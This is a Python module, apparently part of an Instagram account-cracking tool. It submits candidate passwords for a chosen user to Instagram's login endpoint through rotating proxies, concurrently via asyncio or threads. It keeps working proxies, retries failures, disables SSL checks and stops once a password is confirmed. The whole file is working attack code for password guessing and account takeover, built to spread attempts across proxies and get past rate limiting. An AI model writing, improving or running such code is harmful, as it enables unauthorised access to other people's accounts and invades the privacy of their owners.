from __future__ import absolute_import

import collections
import logging

import aiohttp
import asyncio
import concurrent.futures
import requests

from app import settings
from app.lib import exceptions
from app.lib.utils import (
    AysncExceptionHandler, SyncExceptionHandler, auto_logger, format_proxy,
    cancel_remaining_tasks, AsyncTaskManager)
from app.lib.models import InstagramResult

from .requests import request_handler


LoginTaskContext = collections.namedtuple('LoginTaskContext',
    'name proxy token password')


class login_handler(request_handler):

    # We are going to have to adjust these probably - it might take more than
    # 10 attempts to retrieve a result if we have bad proxies.
    # This might not be as appropriate for async cases.
    ATTEMPT_LIMIT = settings.LOGIN_ATTEMPT_LIMIT

    def __init__(self, user, global_stop_event, queues):
        super(login_handler, self).__init__(global_stop_event, queues)
        self.user = user

    def login_data(self, password):
        return {
            'username': self.user.username,
            'password': password
        }

    def _headers(self, token):
        headers = super(login_handler, self)._headers()
        headers['x-csrftoken'] = token
        return headers

    def _log_context(self, context, **kwargs):
        context = {
            'task': context.name,
            'proxy': context.proxy,
            'token': context.token,
            'password': context.password,
        }
        context.update(**kwargs)
        return context

    async def task_generator(self, log, password, **context):
        index = 0
        while not self.stop_event.is_set() and index < self.ATTEMPT_LIMIT:
            proxy = await self.queues.proxies.get_best()
            index += 1

            _context = LoginTaskContext(
                name=f'Login Task {index}',
                proxy=proxy,
                password=password,
                **context,
            )

            log.debug("Submitting Task", extra={
                'task': _context.name,
            })

            yield _context


class async_login_handler(login_handler):
    ATTEMPT_LIMIT = 5
    CONNECTOR_KEEP_ALIVE_TIMEOUT = 3.0

    @property
    def connector(self):
        """
        TCPConnector
        -------------
        keepalive_timeout (float) – timeout for connection reusing aftet
            releasing
        limit_per_host (int) – limit simultaneous connections to the same
            endpoint (default is 0)
        """
        return aiohttp.TCPConnector(
            ssl=False,
            keepalive_timeout=self.CONNECTOR_KEEP_ALIVE_TIMEOUT,
            enable_cleanup_closed=True,
        )

    @property
    def timeout(self):
        return aiohttp.ClientTimeout(
            total=settings.DEFAULT_LOGIN_FETCH_TIME
        )

    async def _get_result_from_response(self, response):
        try:
            result = await response.json()
        except ValueError:
            raise exceptions.ResultNotInResponse()
        else:
            return InstagramResult.from_dict(result)

    async def _handle_client_response(self, response, context, log):
        """
        Takes the AIOHttp ClientResponse and tries to return a parsed
        InstagramResult object.

        For AIOHttp sessions and client responses, we cannot read the json
        after response.raise_for_status() has been called.

        Since a 400 response will have valid json that can indicate an authentication,
        via a `checkpoint_required` value, we cannot raise_for_status until after
        we try to first get the response json.
        """
        if response.status >= 400 and response.status < 500:
            if response.status == 400:
                return await self._get_result_from_response(response)
            else:
                response.raise_for_status()
        else:
            try:
                return await self._get_result_from_response(response)
            except exceptions.ResultNotInResponse as e:
                raise exceptions.FatalException(
                    "Unexpected behavior, result should be in response.",
                    extra=self._log_context(context, response=response)
                )

    async def _handle_parsed_result(self, result, context, log):
        """
        Raises an exception if the result that was in the response is either
        non-conclusive or has an error in it.

        If the result does not have an error and is non conslusive, than we
        can assume that the proxy was most likely good.
        """
        if result.has_error:
            raise exceptions.InstagramResultError(result.error_message)
        else:
            if not result.conclusive:
                raise exceptions.InstagramResultError("Inconslusive result.")
            return result

    async def request(self, session, context, retry=1):
        """
        Do not want to automatically raise for status because we can have
        a 400 error but enough info in response to authenticate.

        Also, once response.raise_for_status() is called, we cannot access
        the response.json().
        """
        # Autologger not working because of keyword argument
        log = logging.getLogger('Login')
        self.log_post_request(context, log, retry=retry)

        try:
            async with session.post(
                settings.INSTAGRAM_LOGIN_URL,
                headers=self._headers(context.token),
                data=self.login_data(context.password),
                timeout=settings.DEFAULT_LOGIN_FETCH_TIME,
                proxy=format_proxy(context.proxy)
            ) as response:
                # Only reason to log these errors here is to provide the response
                # object
                try:
                    result = await self._handle_client_response(response, context, log)
                    result = await self._handle_parsed_result(result, context, log)

                except exceptions.ResultNotInResponse as e:
                    log.error(e, extra=self._log_context(context, response=response))

                except exceptions.InstagramResultError as e:
                    log.error(e, extra=self._log_context(context, response=response))

                else:
                    if not result:
                        raise exceptions.FatalException("Result should not be None here.")
                    self.queues.proxies.good.put_nowait(context.proxy)

                    return result

        except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError,
                asyncio.TimeoutError) as e:
            retry += 1

            # We probably want to lower this number
            if retry < 5:
                # Session should still be alive.
                await asyncio.sleep(1)
                return await self.request(session, context, retry=retry)
            else:
                log.error(e, extra=self._log_context(context))
                return None

            # Session should still be alive.
            await asyncio.sleep(1)
            return await self.request(session, context, retry=retry)

        except aiohttp.ClientError as e:
            log.error(e, extra=self._log_context(context))

        except Exception as e:
            raise exceptions.FatalException(f'Uncaught Exception: {str(e)}')

    @auto_logger("Synchronous Asyncio Login")
    async def run_synchronous(self, token, password, log):

        async with aiohttp.ClientSession(
            connector=self.connector,
            timeout=self.timeout
        ) as session:
            async for context in self.task_generator(log, password, token=token):
                log.debug("Submitting Task", extra={
                    'task': context.name
                })
                if not self.stop_event.is_set():
                    result = await self.request(session, context)
                    if result:
                        if result.has_error:
                            log.warning(result.error_message, extra={
                                'token': token,
                                'password': password,
                                'task': context.name,
                            })
                        else:
                            self.queues.proxies.good.put_nowait(context.proxy)
                            if result.conclusive:
                                self.stop_event.set()
                                return result

    @auto_logger("Asychronous Asyncio Login")
    async def run_asynchronous(self, token, password, log):
        """
        Asyncio Docs:

        asyncio.as_completed
        -------------------
            Run awaitable objects in the aws set concurrently. Return an iterator
            of Future objects. Each Future object returned represents the earliest
            result from the set of the remaining awaitables.

            Raises asyncio.TimeoutError if the timeout occurs before all Futures are done.

        TODO
        -----
        Incorporate timeout into asyncio.as_completed() just in case of situations
        where it could get caught.

        IMPORTANT
        _________
        What we should do is start off with a minimum of like 3 requests, if none
        of those succeed, then incrementally add one more one more etc. - the issue
        is if we do not get a valid response for any of the 5 requests we set.
        """
        # ClientSession should remain open in between futures, so looping over
        # the context within the session shouldn't make a difference.
        async with AsyncTaskManager(self.stop_event, log=log) as task_manager:
            async with aiohttp.ClientSession(
                connector=self.connector,
                timeout=self.timeout
            ) as session:
                async for context in self.task_generator(log, password, token=token):
                    log.debug("Submitting Task", extra={
                        'task': context.name
                    })
                    task = asyncio.create_task(self.request(session, context))
                    task_manager.add(task)

                for future in asyncio.as_completed(task_manager.tasks, timeout=None):
                    # Result can be None if there was a request error or the result
                    # was invalid, but if the result is present - it is guaranteed to
                    # be conclusive.
                    try:
                        result = await future
                    except asyncio.CancelledError:
                        continue
                    else:
                        if result:
                            if not result.conclusive:
                                raise exceptions.FatalException("Result should be conslusive.")

                            await task_manager.stop()
                            return result


class futures_login_handler(login_handler):
    THREAD_LIMIT = settings.LOGIN_THREAD_LIMIT

    def _get_result_from_response(self, response):
        try:
            result = response.json()
        except ValueError:
            raise exceptions.ResultNotInResponse()
        else:
            return InstagramResult.from_dict(result)

    def _handle_client_response(self, response, log, extra=None):
        extra = extra or {}
        extra.update(response=response)

        try:
            response.raise_for_status()
        except requests.exceptions.HTTPError as e:
            if response.status_code == 400:
                try:
                    return self._get_result_from_response(response)
                except exceptions.ResultNotInResponse:
                    log.error(e, extra=extra)
                    return None
            else:
                log.error(e, extra=extra)
                return None
        else:
            try:
                return self._get_result_from_response(response)
            except exceptions.ResultNotInResponse:
                log.critical("Unexpected behavior, result should be in response.")
                return None

    @auto_logger("Login")
    def request(self, session, context, log):

        self.log_post_request(context, log)

        try:
            response = session.post(
                settings.INSTAGRAM_LOGIN_URL,
                headers=self._headers(context.token),
                data=self.login_data(context.password),
                timeout=settings.DEFAULT_LOGIN_FETCH_TIME,
                proxies={
                    'http': format_proxy(context.proxy),
                    'https': format_proxy(context.proxy, scheme='https'),
                },
            )
        except requests.exceptions.ConnectionError as e:
            log.error(e, extra=self._log_context(context))
            return None
        except Exception as e:
            raise exceptions.FatalException(f'Uncaught Exception: {str(e)}')
        else:
            # TODO: For client responses, we might want to raise a harder exception
            # if we get a 403.
            return self._handle_client_response(response, context, log)

    @auto_logger("Sychronous Futures Login")
    async def run_synchronous(self, token, password, log):

        session = requests.Session()
        async with AsyncTaskManager(self.stop_event, log=log) as task_manager:
            # We probably want this block to run synchronously because this represents
            # a series of attempts for a single password over a range of proxies.
            async for context in self.task_generator(log, password, token=token):
                result = self.request(session, context)
                if result:
                    if result.has_error:
                        log.warning(result.error_message, extra={
                            'token': token,
                            'password': password,
                            'task': context.name,
                        })
                    else:
                        self.queues.proxies.good.put_nowait(context.proxy)
                        if result.conclusive:
                            task_manager.stop()
                            return result

    @auto_logger("Asychronous Futures Login")
    async def run_asynchronous(self, token, password, log):
        """
        TODO: We are going to want to start putting proxies back in the queue
        if they resulted in successful requests.
        """
        async with AsyncTaskManager(self.stop_event, log=log) as task_manager:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.THREAD_LIMIT) as executor:
                session = requests.Session()

                # We probably want this block to run synchronously because this represents
                # a series of attempts for a single password over a range of proxies.
                async for context in self.task_generator(log, password, token=token):
                    log.debug("Submitting Task", extra={
                        'task': context.name
                    })
                    login_future = executor.submit(self.request, session, context)
                    setattr(login_future, '__context__', context)
                    task_manager.add(login_future)

                for future in concurrent.futures.as_completed(task_manager.tasks):
                    log.debug("Finished Task", extra={
                        'task': future.__context__.name,
                        'proxy': future.__context__.proxy,
                    })
                    result = future.result()
                    if result:
                        if result.has_error:
                            log.warning(result.error_message, extra={
                                'token': token,
                                'password': password,
                                'task': future.__context__.name,
                            })
                        else:
                            self.queues.proxies.good.put_nowait(future.__context__.proxy)
                            if result.conclusive:
                                await task_manager.stop()
                                executor.shutdown()
                                return result
